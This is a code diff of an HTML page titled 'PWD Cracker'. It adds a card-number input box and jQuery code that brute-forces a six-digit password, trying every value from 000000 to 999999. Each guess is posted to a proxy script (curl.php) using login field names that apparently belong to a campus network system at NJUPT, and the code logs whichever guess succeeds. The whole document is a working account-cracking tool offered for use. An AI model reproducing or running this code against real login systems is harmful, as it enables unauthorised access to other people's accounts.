@@ -1,35 +1,86 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Cracker - FuckNJUPT</title>
     <meta name="keywords" content="">
     <meta name="description" content="" />
     <link rel="shortcut icon" href="/favicon.ico" />
-
     <meta name="Author" contect="Rijn">
     <meta property="og:title" content="Cracker" />
     <meta property="og:description" content="" />
     <meta property="og:url" content="http://bhf.rijnx.com" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-
     <link rel="stylesheet" type="text/css" href="dist/ui.css">
-    
-
 </head>
 
 <body>
-
     <header>
         <h2>PWD Cracker</h2>
-        <p>Copyright &copy; BHFaction, 2015.
+        <p>Copyright &copy; BHFaction, 2015.</p>
     </header>
-
+    <div class="import">
+        <input id="card" type="text" placeHolder="Card">
+        <button class="button" id="submit">Submit</button>
+    </div>
+    <p>-</p>
+    <div class="result">
+        <div class="count"></div>
+    </div>
     <footer>
     </footer>
 
     <script src="dist/jquery-2.1.4.min.js"></script>
-    <script src="dist/app.js"></script>
+    <!-- <script src="dist/app.js"></script> -->
 
+    <script type="text/javascript">
+
+        function padNumber(num, fill) {
+            var len = ('' + num).length;
+            return (Array(
+                fill > len ? fill - len + 1 || 0 : 0
+            ).join(0) + num);
+        }
+
+        function probe(pwd) {
+
+            var POST = {
+                "DDDDD" : $("#card").val(),
+                "upass" : padNumber(pwd, 6),
+                "0MKKey" : "",
+            };
+
+            $.ajax({
+                url: "curl.php",
+                type: "POST",
+                data: POST,
+                beforeSend: function() {
+                    $('.count').html(pwd + " / 999999 => " + (pwd / 999999 * 100).toFixed(4) + " % done.");
+                },
+                success:function(msg){
+                    // console.log(msg)
+                    if(msg == "1")
+                    {
+                        console.log(pwd);
+                    } else {
+                        if(pwd < 999999)
+                        {
+                            setTimeout(function() {
+                                probe(pwd+1);
+                            }, 10);　　
+                        }
+                    }
+                },
+                complete: function() {
+
+                }
+            });
+        }
+
+        $('#submit').click(function() {
+            probe(0);
+        });
+
+    </script>
 </body>
